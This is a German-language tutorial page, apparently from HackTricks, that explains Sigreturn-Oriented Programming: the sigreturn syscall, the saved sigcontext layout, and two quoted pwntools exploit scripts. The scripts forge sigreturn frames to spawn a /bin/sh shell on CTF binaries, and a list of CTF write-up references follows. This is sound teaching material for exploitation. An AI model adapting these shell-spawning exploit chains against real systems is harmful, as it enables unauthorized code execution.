# SROP - Sigreturn-Oriented Programming

{{#include ../../../banners/hacktricks-training.md}}

## Grundinformationen

**`Sigreturn`** ist ein spezieller **syscall**, der hauptsächlich verwendet wird, um nach der Ausführung eines Signalhandlers aufzuräumen. Signale sind Unterbrechungen, die vom Betriebssystem an ein Programm gesendet werden, oft um anzuzeigen, dass eine außergewöhnliche Situation aufgetreten ist. Wenn ein Programm ein Signal erhält, pausiert es vorübergehend seine aktuelle Arbeit, um das Signal mit einem **Signalhandler** zu behandeln, einer speziellen Funktion, die dafür ausgelegt ist, mit Signalen umzugehen.

Nachdem der Signalhandler fertig ist, muss das Programm seinen **vorherigen Zustand wiederherstellen**, als ob nichts passiert wäre. Hier kommt **`sigreturn`** ins Spiel. Es hilft dem Programm, **vom Signalhandler zurückzukehren** und stellt den Zustand des Programms wieder her, indem es das Stack-Frame (den Speicherbereich, der Funktionsaufrufe und lokale Variablen speichert) aufräumt, das vom Signalhandler verwendet wurde.

Der interessante Teil ist, wie **`sigreturn`** den Zustand des Programms wiederherstellt: Es geschieht, indem **alle Registerwerte der CPU auf dem Stack gespeichert werden.** Wenn das Signal nicht mehr blockiert ist, **poppt `sigreturn` diese Werte vom Stack**, wodurch die Register der CPU auf ihren Zustand vor der Signalbehandlung zurückgesetzt werden. Dazu gehört das Stack-Zeiger-Register (RSP), das auf die aktuelle Spitze des Stacks zeigt.

> [!CAUTION]
> Das Aufrufen des syscalls **`sigreturn`** aus einer ROP-Kette und **das Hinzufügen der Registerwerte**, die wir im **Stack** laden möchten, ermöglicht es, **alle Registerwerte zu steuern** und daher beispielsweise den syscall `execve` mit `/bin/sh` aufzurufen.

Beachten Sie, dass dies eine **Art von Ret2syscall** wäre, die es viel einfacher macht, Parameter zu steuern, um andere Ret2syscalls aufzurufen:

{{#ref}}
../rop-syscall-execv/
{{#endref}}

Wenn Sie neugierig sind, dies ist die **sigcontext-Struktur**, die im Stack gespeichert wird, um später die Werte wiederherzustellen (Diagramm von [**hier**](https://guyinatuxedo.github.io/16-srop/backdoor_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
Für eine bessere Erklärung siehe auch:

{{#ref}}
https://youtu.be/ADULSwnQs-s?feature=shared
{{#endref}}

## Beispiel

Du kannst [**ein Beispiel hier finden**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop), wo der Aufruf von signeturn über ROP konstruiert wird (indem der Wert `0xf` in rxa gesetzt wird), obwohl dies der endgültige Exploit von dort ist:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
Überprüfen Sie auch den [**Exploit von hier**](https://guyinatuxedo.github.io/16-srop/csaw19_smallboi/index.html), wo die Binärdatei bereits `sigreturn` aufgerufen hat und es daher nicht erforderlich ist, dies mit einem **ROP** zu erstellen:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## Weitere Beispiele & Referenzen

- [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
- [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
- [https://guyinatuxedo.github.io/16-srop/backdoor_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor_funsignals/index.html)
- Assembly-Binärdatei, die es ermöglicht, **in den Stack zu schreiben** und dann den **`sigreturn`** Syscall aufzurufen. Es ist möglich, einen [**ret2syscall**](../rop-syscall-execv/) über eine **sigreturn** Struktur auf den Stack zu schreiben und das Flag zu lesen, das sich im Speicher der Binärdatei befindet.
- [https://guyinatuxedo.github.io/16-srop/csaw19_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19_smallboi/index.html)
- Assembly-Binärdatei, die es ermöglicht, **in den Stack zu schreiben** und dann den **`sigreturn`** Syscall aufzurufen. Es ist möglich, einen [**ret2syscall**](../rop-syscall-execv/) über eine **sigreturn** Struktur zu schreiben (die Binärdatei enthält die Zeichenkette `/bin/sh`).
- [https://guyinatuxedo.github.io/16-srop/inctf17_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17_stupidrop/index.html)
- 64 Bit, kein relro, kein canary, nx, kein pie. Einfacher Buffer Overflow, der die `gets` Funktion ausnutzt, mit einem Mangel an Gadgets, die einen [**ret2syscall**](../rop-syscall-execv/) ausführen. Die ROP-Kette schreibt `/bin/sh` in die `.bss`, indem sie `gets` erneut aufruft, sie missbraucht die **`alarm`** Funktion, um eax auf `0xf` zu setzen, um ein **SROP** aufzurufen und eine Shell auszuführen.
- [https://guyinatuxedo.github.io/16-srop/swamp19_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19_syscaller/index.html)
- 64-Bit-Assembly-Programm, kein relro, kein canary, nx, kein pie. Der Fluss ermöglicht es, in den Stack zu schreiben, mehrere Register zu steuern und einen Syscall aufzurufen, und dann wird `exit` aufgerufen. Der ausgewählte Syscall ist ein `sigreturn`, der Register setzen und `eip` verschieben wird, um eine vorherige Syscall-Anweisung aufzurufen und `memprotect` auszuführen, um den Binärspeicher auf `rwx` zu setzen und den ESP im Binärspeicher zu setzen. Folgt man dem Fluss, wird das Programm `read` erneut in den ESP aufrufen, aber in diesem Fall wird der ESP auf die nächste Anweisung zeigen, sodass das Übergeben eines Shellcodes es als die nächste Anweisung schreiben und ausführen wird.
- [https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop#disable-stack-protection)
- SROP wird verwendet, um Ausführungsprivilegien (memprotect) an den Ort zu geben, an dem ein Shellcode platziert wurde.

{{#include ../../../banners/hacktricks-training.md}}
